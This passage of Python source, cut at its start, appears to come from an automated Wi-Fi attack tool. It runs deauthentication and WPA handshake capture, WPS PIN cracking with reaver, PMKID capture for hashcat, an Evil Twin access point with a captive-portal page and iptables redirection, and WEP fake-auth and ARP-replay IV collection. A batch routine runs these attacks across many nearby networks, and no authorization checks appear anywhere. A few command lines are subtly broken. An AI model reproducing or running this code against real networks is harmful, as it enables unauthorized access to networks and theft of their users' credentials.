                    self.log(f"No handshake yet, trying another deauthentication...", phase="ATTACK")
                    self.perform_deauth_attack(bssid, count=3)
                
                time.sleep(3)
        finally:
            # Terminate airodump-ng
            if dump_process.poll() is None:
                dump_process.terminate()
                try:
                    dump_process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    dump_process.kill()
        
        if handshake_captured:
            self.log(f"WPA handshake captured successfully!", success=True, phase="ATTACK")
            return True, capture_file
        else:
            self.log(f"Failed to capture WPA handshake within timeout", error=True, phase="ATTACK")
            return False, ""
    
    def perform_wps_pin_attack(self, bssid: str, channel: str, timeout: int = 180) -> Tuple[bool, str, str]:
        """
        Perform WPS PIN attack
        Returns (success, pin, password)
        """
        if not self.monitor_interface:
            self.log("No monitor interface available", error=True)
            return False, "", ""
            
        network = self.get_network_by_bssid(bssid)
        if not network:
            self.log(f"Network {bssid} not found", error=True)
            return False, "", ""
            
        self.log(f"Attempting WPS PIN attack on {network.ssid} ({bssid})...", phase="ATTACK")
        
        # Check if we're in development mode
        if self.dev_mode:
            # Simulate WPS PIN attack
            self.log(f"DEVELOPMENT MODE: Simulating WPS PIN attack on {bssid}", phase="ATTACK")
            
            # Simulate PIN cracking
            self.log(f"Testing PIN 12345670... (simulated)", phase="ATTACK")
            time.sleep(3)  # Simulate test duration
            
            self.log(f"Testing PIN 00000000... (simulated)", phase="ATTACK")
            time.sleep(2)  # Simulate test duration
            
            # Determine if this is a "vulnerable" network in our simulation
            is_vulnerable = network.ssid.lower() in ["home-router-5g", "guest-wifi", "iot-network"]
            
            if is_vulnerable:
                # Simulate success
                pin = "12345670"
                password = "Password123"
                self.log(f"WPS PIN attack successful! PIN: {pin}, Password: {password}", success=True, phase="ATTACK")
                return True, pin, password
            else:
                # Simulate failure
                self.log(f"WPS PIN attack failed. Target may not be vulnerable.", error=True, phase="ATTACK")
                return False, "", ""
        
        # Use reaver for WPS attack
        cmd = [
            "sudo", "reaver",
            "-i", self.monitor_interface,
            "-b", bssid,
            "-c", channel,
            "-vv",
            "--no-associate"  # Let reaver handle association
        ]
        
        # Execute attack with timeout
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1  # Line buffered
        )
        
        pin = ""
        password = ""
        success = False
        start_time = time.time()
        
        try:
            # Monitor output in real-time
            while process.poll() is None and time.time() - start_time < timeout:
                output_line = process.stdout.readline().strip()
                if output_line:
                    # Log interesting output
                    if "Trying pin" in output_line:
                        pin_match = re.search(r"Trying pin (\d+)", output_line)
                        if pin_match:
                            current_pin = pin_match.group(1)
                            self.log(f"Testing PIN {current_pin}...", phase="ATTACK")
                    
                    # Check for success
                    if "WPS PIN:" in output_line:
                        pin_match = re.search(r"WPS PIN: (\d+)", output_line)
                        if pin_match:
                            pin = pin_match.group(1)
                    
                    if "WPA PSK:" in output_line:
                        pwd_match = re.search(r"WPA PSK: '(.+)'", output_line)
                        if pwd_match:
                            password = pwd_match.group(1)
                    
                    # If we have both pin and password, we succeeded
                    if pin and password:
                        success = True
                        break
                
                # Check if we've reached the timeout
                if time.time() - start_time >= timeout:
                    break
                
                # Small sleep to prevent CPU overload
                time.sleep(0.1)
        finally:
            # Terminate reaver
            if process.poll() is None:
                process.terminate()
                try:
                    process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    process.kill()
        
        if success:
            self.log(f"WPS PIN attack successful! PIN: {pin}, Password: {password}", success=True, phase="ATTACK")
            return True, pin, password
        else:
            self.log(f"WPS PIN attack failed. Target may not be vulnerable or timeout reached.", error=True, phase="ATTACK")
            return False, "", ""

    def perform_pmkid_attack(self, bssid: str, timeout: int = 60) -> Tuple[bool, str]:
        """
        Perform PMKID attack
        Returns (success, capture_file)
        """
        if not self.monitor_interface:
            self.log("No monitor interface available", error=True)
            return False, ""
            
        network = self.get_network_by_bssid(bssid)
        if not network:
            self.log(f"Network {bssid} not found", error=True)
            return False, ""
            
        self.log(f"Attempting PMKID attack on {network.ssid} ({bssid})...", phase="ATTACK")
        
        # Check if we're in development mode
        if self.dev_mode:
            # Simulate PMKID attack
            self.log(f"DEVELOPMENT MODE: Simulating PMKID attack on {bssid}", phase="ATTACK")
            
            # Simulate attack phases
            self.log(f"Sending association request to target... (simulated)", phase="ATTACK")
            time.sleep(2)  # Simulate test duration
            
            # Determine if this is a "vulnerable" network in our simulation
            is_vulnerable = network.ssid.lower() in ["home-router-5g", "office-network"]
            
            if is_vulnerable:
                # Simulate success
                capture_file = f"pmkid_{bssid.replace(':', '')}.pcapng"
                self.log(f"PMKID captured successfully! (simulated)", success=True, phase="ATTACK")
                return True, capture_file
            else:
                # Simulate failure
                self.log(f"PMKID attack failed. Target may not be vulnerable.", error=True, phase="ATTACK")
                return False, ""
        
        # Create temporary directory for capture file
        temp_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp")
        os.makedirs(temp_dir, exist_ok=True)
        
        # Generate unique filename for this capture
        timestamp = int(time.time())
        output_file = os.path.join(temp_dir, f"pmkid_{timestamp}.pcapng")
        
        # Use hcxdumptool for PMKID capture
        cmd = [
            "sudo", "hcxdumptool",
            "-i", self.monitor_interface,
            "-o", output_file,
            "--enable_status=1",
            "--filterlist_ap=", bssid,
            "--filtermode=2"
        ]
        
        # Execute command with timeout
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1  # Line buffered
        )
        
        success = False
        start_time = time.time()
        
        try:
            # Monitor output in real-time
            while process.poll() is None and time.time() - start_time < timeout:
                output_line = process.stdout.readline().strip()
                if output_line:
                    # Log interesting output
                    if "AP-LESS attack" in output_line or "AP attack" in output_line:
                        self.log(f"Sending association request to target...", phase="ATTACK")
                    
                    # Check for PMKID
                    if "PMKID" in output_line:
                        success = True
                        break
                
                # Check if we've reached the timeout
                if time.time() - start_time >= timeout:
                    break
                
                # Small sleep to prevent CPU overload
                time.sleep(0.1)
        finally:
            # Terminate hcxdumptool
            if process.poll() is None:
                process.terminate()
                try:
                    process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    process.kill()
        
        # Check if the capture contains a PMKID
        if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
            # Convert capture to hashcat format
            hash_file = os.path.join(temp_dir, f"pmkid_{timestamp}.hc22000")
            convert_cmd = [
                "sudo", "hcxpcapngtool",
                "-o", hash_file,
                output_file
            ]
            
            success_convert, output, error = SecurityUtils.run_command(convert_cmd)
            
            if success_convert and os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
                success = True
        
        if success:
            self.log(f"PMKID captured successfully!", success=True, phase="ATTACK")
            return True, output_file
        else:
            self.log(f"PMKID attack failed. Target may not be vulnerable.", error=True, phase="ATTACK")
            return False, ""

    def check_default_credentials(self, bssid: str) -> Tuple[bool, List[Dict[str, str]]]:
        """
        Check if target uses default credentials
        Returns (success, list of found credentials)
        """
        network = self.get_network_by_bssid(bssid)
        if not network:
            self.log(f"Network {bssid} not found", error=True)
            return False, []
            
        self.log(f"Checking for default credentials on {network.ssid} ({bssid})...", phase="ATTACK")
        
        # Check if we're in development mode
        if self.dev_mode:
            # Simulate default credentials check
            self.log(f"DEVELOPMENT MODE: Simulating default credentials check on {bssid}", phase="ATTACK")
            
            # Simulate testing
            self.log(f"Testing common default credentials... (simulated)", phase="ATTACK")
            time.sleep(2)  # Simulate test duration
            
            # Check if target is a simulated "vulnerable" network
            is_vulnerable = network.ssid.lower() in ["iot-network", "guest-wifi"]
            
            if is_vulnerable:
                # Return simulated credentials
                found_creds = []
                
                if "iot" in network.ssid.lower():
                    found_creds.append({"username": "admin", "password": "admin123"})
                elif "guest" in network.ssid.lower():
                    found_creds.append({"username": "admin", "password": ""})
                    
                if found_creds:
                    self.log(f"Default credentials found! {len(found_creds)} credential sets discovered.", success=True, phase="ATTACK")
                    return True, found_creds
                
            self.log(f"No default credentials found.", phase="ATTACK")
            return False, []
        
        # Load default credentials wordlist
        wordlist_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), self.attack_params.default_creds_wordlist)
        
        if not os.path.exists(wordlist_path):
            self.log(f"Default credentials wordlist not found: {wordlist_path}", error=True)
            return False, []
        
        # Load credentials from wordlist
        credentials = []
        try:
            with open(wordlist_path, 'r') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                        
                    parts = line.split(':')
                    if len(parts) >= 2:
                        username = parts[0]
                        password = parts[1]
                        credentials.append((username, password))
        except Exception as e:
            self.log(f"Error loading default credentials: {str(e)}", error=True)
            return False, []
        
        self.log(f"Testing {len(credentials)} common default credential pairs...", phase="ATTACK")
        
        # Attempt to find default credentials
        found_creds = []
        
        # TODO: Implement actual testing of default credentials on the target
        # This would typically involve:
        # 1. Identifying the device type/vendor
        # 2. Connecting to the network
        # 3. Locating the management interface
        # 4. Testing credentials
        
        # For now, we'll return a simulated result
        self.log(f"Note: Actual testing of credentials requires network connection.", phase="ATTACK")
        self.log(f"No default credentials found.", phase="ATTACK")
        
        return len(found_creds) > 0, found_creds

    def launch_evil_twin_attack(self, bssid: str, ssid: str, channel: str, template_type: str = "generic") -> bool:
        """
        Launch Evil Twin attack
        Returns success boolean
        """
        if not self.interface:
            self.log("No interface selected", error=True)
            return False
            
        self.log(f"Setting up Evil Twin attack for {ssid} ({bssid})...", phase="ATTACK")
        
        # Check if we're in development mode
        if self.dev_mode:
            # Simulate Evil Twin attack
            self.log(f"DEVELOPMENT MODE: Simulating Evil Twin attack for {ssid}", phase="ATTACK")
            
            # Simulate setup
            self.log(f"Creating access point with SSID {ssid}... (simulated)", phase="ATTACK")
            time.sleep(2)  # Simulate setup duration
            
            self.log(f"Starting DHCP server... (simulated)", phase="ATTACK")
            time.sleep(1)  # Simulate setup duration
            
            self.log(f"Starting web server with {template_type} template... (simulated)", phase="ATTACK")
            time.sleep(1)  # Simulate setup duration
            
            self.log(f"Evil Twin attack ready! Waiting for connections... (simulated)", success=True, phase="ATTACK")
            return True
        
        # Check if required tools are installed
        tools = ["airbase-ng", "dnsmasq", "hostapd", "iptables", "python3"]
        missing_tools = []
        
        for tool in tools:
            if shutil.which(tool) is None:
                missing_tools.append(tool)
        
        if missing_tools:
            self.log(f"Missing required tools: {', '.join(missing_tools)}", error=True)
            return False
        
        # Create temporary directory for Evil Twin files
        temp_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp", "evil_twin")
        os.makedirs(temp_dir, exist_ok=True)
        
        # Kill potentially conflicting processes
        SecurityUtils.run_command(["sudo", "airmon-ng", "check", "kill"])
        
        # 1. Setup interface for AP mode
        managed_interface = self.interface
        current_mode = SecurityUtils.get_interface_mode(managed_interface)
        
        if current_mode == "monitor":
            success, managed_interface = SecurityUtils.set_monitor_mode(managed_interface, False, self.log)
            if not success:
                self.log("Failed to set interface to managed mode", error=True)
                return False
        
        # 2. Configure hostapd
        hostapd_conf = os.path.join(temp_dir, "hostapd.conf")
        with open(hostapd_conf, 'w') as f:
            f.write(f"""
interface={managed_interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
""")
        
        # 3. Configure dnsmasq for DHCP
        dnsmasq_conf = os.path.join(temp_dir, "dnsmasq.conf")
        with open(dnsmasq_conf, 'w') as f:
            f.write(f"""
interface={managed_interface}
dhcp-range=192.168.1.2,192.168.1.100,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
listen-address=127.0.0.1
listen-address=192.168.1.1
address=/#/192.168.1.1
""")
        
        # 4. Setup interface address
        SecurityUtils.run_command(["sudo", "ifconfig", managed_interface, "192.168.1.1", "netmask", "255.255.255.0"])
        
        # 5. Configure iptables for redirection
        cmds = [
            ["sudo", "iptables", "--flush"],
            ["sudo", "iptables", "--table", "nat", "--flush"],
            ["sudo", "iptables", "--delete-chain"],
            ["sudo", "iptables", "--table", "nat", "--delete-chain"],
            ["sudo", "iptables", "--table", "nat", "--append", "POSTROUTING", "--out-interface", "eth0", "-j", "MASQUERADE"],
            ["sudo", "iptables", "--append", "FORWARD", "--in-interface", managed_interface, "-j", "ACCEPT"],
            ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", "8080"],
            ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", "8080"],
            ["sudo", "echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"]
        ]
        
        for cmd in cmds:
            SecurityUtils.run_command(cmd)
        
        # 6. Start hostapd
        hostapd_proc = subprocess.Popen(
            ["sudo", "hostapd", hostapd_conf],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        # Wait for hostapd to start
        time.sleep(5)
        
        if hostapd_proc.poll() is not None:
            self.log("Failed to start hostapd", error=True)
            return False
        
        self.log(f"Access point {ssid} started successfully")
        
        # 7. Start dnsmasq
        dnsmasq_proc = subprocess.Popen(
            ["sudo", "dnsmasq", "-C", dnsmasq_conf, "-d"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        # Wait for dnsmasq to start
        time.sleep(2)
        
        if dnsmasq_proc.poll() is not None:
            self.log("Failed to start dnsmasq", error=True)
            hostapd_proc.terminate()
            return False
        
        self.log(f"DHCP server started successfully")
        
        # 8. Start web server for captive portal
        # Create web server directory
        web_dir = os.path.join(temp_dir, "portal")
        os.makedirs(web_dir, exist_ok=True)
        
        # Choose template based on type
        template_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 
                                   "templates", "evil_twin", f"{template_type}.html")
        
        if not os.path.exists(template_path):
            template_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 
                                       "templates", "evil_twin", "generic.html")
        
        # Copy template to web directory
        target_index = os.path.join(web_dir, "index.html")
        shutil.copy(template_path, target_index)
        
        # Start simple HTTP server
        os.chdir(web_dir)
        web_server_proc = subprocess.Popen(
            ["python3", "-m", "http.server", "8080"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        # Wait for web server to start
        time.sleep(2)
        
        if web_server_proc.poll() is not None:
            self.log("Failed to start web server", error=True)
            hostapd_proc.terminate()
            dnsmasq_proc.terminate()
            return False
        
        self.log(f"Web server started with {template_type} template")
        self.log(f"Evil Twin attack ready! Waiting for connections...", success=True, phase="ATTACK")
        
        # Return success - the attack is now running
        # (In a real implementation, we would store these process handles and provide a way to stop them)
        return True

    def collect_wep_ivs(self, bssid: str, channel: str, timeout: int = 120) -> Tuple[bool, str]:
        """
        Collect IVs for WEP cracking
        Returns (success, capture_file)
        """
        if not self.monitor_interface:
            self.log("No monitor interface available", error=True)
            return False, ""
            
        network = self.get_network_by_bssid(bssid)
        if not network:
            self.log(f"Network {bssid} not found", error=True)
            return False, ""
            
        self.log(f"Starting WEP IV collection for {network.ssid} ({bssid})...", phase="ATTACK")
        
        # Check if we're in development mode
        if self.dev_mode:
            # Simulate WEP IV collection
            self.log(f"DEVELOPMENT MODE: Simulating WEP IV collection for {bssid}", phase="ATTACK")
            
            # Simulate collection phases
            self.log(f"Capturing data packets... (simulated)", phase="ATTACK")
            time.sleep(3)  # Simulate collection duration
            
            self.log(f"Collected 5000 IVs... (simulated)", phase="ATTACK")
            time.sleep(3)  # Simulate collection duration
            
            self.log(f"Collected 10000 IVs... (simulated)", phase="ATTACK")
            time.sleep(3)  # Simulate collection duration
            
            # Simulate success
            capture_file = f"wep_{bssid.replace(':', '')}.cap"
            self.log(f"WEP IV collection complete. Collected more than {self.attack_params.wep_iv_goal} IVs. (simulated)", success=True, phase="ATTACK")
            return True, capture_file
        
        # Create temporary directory for capture file
        temp_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp")
        os.makedirs(temp_dir, exist_ok=True)
        
        # Generate unique filename for this capture
        timestamp = int(time.time())
        output_prefix = os.path.join(temp_dir, f"wep_{timestamp}")
        capture_file = f"{output_prefix}-01.cap"
        
        # Start airodump-ng to capture WEP IVs
        dump_cmd = [
            "sudo", "airodump-ng",
            "--bssid", bssid,
            "--channel", channel,
            "--write", output_prefix,
            "--output-format", "pcap,csv",
            "--ivs",  # Capture only IVs
            self.monitor_interface
        ]
        
        dump_process = subprocess.Popen(
            dump_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        # Wait for airodump-ng to initialize
        time.sleep(3)
        
        # Start aireplay-ng to perform fake authentication
        auth_cmd = [
            "sudo", "aireplay-ng",
            "--fakeauth", "0",
            "-a", bssid,
            self.monitor_interface
        ]
        
        auth_process = subprocess.Popen(
            auth_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        # Wait for authentication to complete
        time.sleep(10)
        
        # Start aireplay-ng to perform ARP replay attack
        arp_cmd = [
            "sudo", "aireplay-ng",
            "--arpreplay",
            "-b", bssid,
            self.monitor_interface
        ]
        
        arp_process = subprocess.Popen(
            arp_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        # Monitor IV collection
        start_time = time.time()
        success = False
        
        try:
            while time.time() - start_time < timeout and not success:
                # Check if enough IVs have been collected
                if os.path.exists(capture_file):
                    # Use aircrack-ng to check how many IVs we have
                    check_cmd = ["sudo", "aircrack-ng", "-a", "1", "-b", bssid, capture_file]
                    check_success, output, error = SecurityUtils.run_command(check_cmd, log_output=False)
                    
                    if check_success:
                        # Parse output to find number of IVs
                        iv_match = re.search(r"(\d+) IVs", output)
                        if iv_match:
                            iv_count = int(iv_match.group(1))
                            self.log(f"Collected {iv_count} IVs so far...", phase="ATTACK")
                            
                            # Check if we have enough IVs
                            if iv_count >= self.attack_params.wep_iv_goal:
                                success = True
                                break
                
                # Sleep before checking again
                time.sleep(5)
        finally:
            # Terminate all processes
            for proc in [dump_process, auth_process, arp_process]:
                if proc and proc.poll() is None:
                    proc.terminate()
                    try:
                        proc.wait(timeout=5)
                    except subprocess.TimeoutExpired:
                        proc.kill()
        
        if success:
            self.log(f"WEP IV collection complete. Collected more than {self.attack_params.wep_iv_goal} IVs.", success=True, phase="ATTACK")
            return True, capture_file
        else:
            self.log(f"Failed to collect enough WEP IVs within timeout", error=True, phase="ATTACK")
            return False, ""

    def run_sequential_tests(self, networks: List[NetworkTarget], attack_types: Dict[str, bool], 
                           timeout: int = 60, dialog=None) -> Dict[str, Dict[str, Any]]:
        """
        Run sequential attacks on multiple networks
        Returns dictionary of results
        """
        if not networks:
            self.log("No networks selected for testing", error=True)
            return {}
            
        if not self.interface:
            self.log("No interface selected", error=True)
            return {}
            
        # Sort networks by signal strength
        sorted_networks = sorted(networks, key=lambda n: n.signal_strength, reverse=True)
        
        self.log(f"Starting sequential testing of {len(sorted_networks)} networks...", phase="ATTACK")
        
        # Enable monitor mode if needed
        current_mode = SecurityUtils.get_interface_mode(self.interface)
        if current_mode != "monitor":
            self.log("Enabling monitor mode...")
            success, monitor_interface = SecurityUtils.set_monitor_mode(self.interface, True, self.log)
            if not success:
                self.log("Failed to enable monitor mode", error=True)
                return {}
            self.monitor_interface = monitor_interface
        else:
            self.monitor_interface = self.interface
            
        # Initialize results dictionary
        results = {}
        
        # Test each network
        for i, network in enumerate(sorted_networks):
            if self.stop_event.is_set():
                self.log("Testing interrupted by user", error=True)
                break
                
            self.log(f"Testing network {i+1}/{len(sorted_networks)}: {network.ssid} ({network.bssid})", phase="ATTACK")
            
            # Initialize result for this network
            results[network.bssid] = {
                "ssid": network.ssid,
                "bssid": network.bssid,
                "channel": network.channel,
                "security": network.security,
                "attacks": {}
            }
            
            # Determine which attacks to run based on network security and user selection
            if attack_types.get("DEFAULT_CREDS", False):
                self.log(f"Checking for default credentials...", phase="ATTACK")
                success, creds = self.check_default_credentials(network.bssid)
                results[network.bssid]["attacks"]["default_creds"] = {
                    "success": success,
                    "creds": creds if success else []
                }
                
            if "WEP" in network.security and attack_types.get("WEP", False):
                self.log(f"Running WEP attack...", phase="ATTACK")
                success, capture_file = self.collect_wep_ivs(network.bssid, network.channel, timeout)
                results[network.bssid]["attacks"]["wep"] = {
                    "success": success,
                    "capture_file": capture_file if success else ""
                }
                
            if "WPA" in network.security or "WPA2" in network.security:
                if attack_types.get("WPS", False) and network.wps_status == "Enabled":
                    self.log(f"Running WPS attack...", phase="ATTACK")
                    success, pin, password = self.perform_wps_pin_attack(network.bssid, network.channel, timeout)
                    results[network.bssid]["attacks"]["wps"] = {
                        "success": success,
                        "pin": pin if success else "",
                        "password": password if success else ""
                    }
                
                if attack_types.get("WPA", False):
                    self.log(f"Running WPA handshake capture...", phase="ATTACK")
                    success, capture_file = self.capture_wpa_handshake(network.bssid, network.channel, timeout)
                    results[network.bssid]["attacks"]["wpa"] = {
                        "success": success,
                        "capture_file": capture_file if success else ""
                    }
                
                if attack_types.get("PMKID", False):
                    self.log(f"Running PMKID attack...", phase="ATTACK")
                    success, capture_file = self.perform_pmkid_attack(network.bssid, timeout)
                    results[network.bssid]["attacks"]["pmkid"] = {
                        "success": success,
                        "capture_file": capture_file if success else ""
                    }
            
            if attack_types.get("PORT_SCAN", False):
                self.log(f"Port scan requires connection to network (skipped)", phase="ATTACK")
                results[network.bssid]["attacks"]["port_scan"] = {
                    "success": False,
                    "message": "Port scan requires connection to network"
                }
            
            if attack_types.get("EVIL_TWIN", False):
                self.log(f"Evil Twin attack requires advanced setup (skipped)", phase="ATTACK")
                results[network.bssid]["attacks"]["evil_twin"] = {
                    "success": False,
                    "message": "Evil Twin attack requires advanced setup"
                }
                
            # Short delay between network tests
            time.sleep(2)
        
        self.log(f"Sequential testing complete.", success=True, phase="ATTACK")
        return results
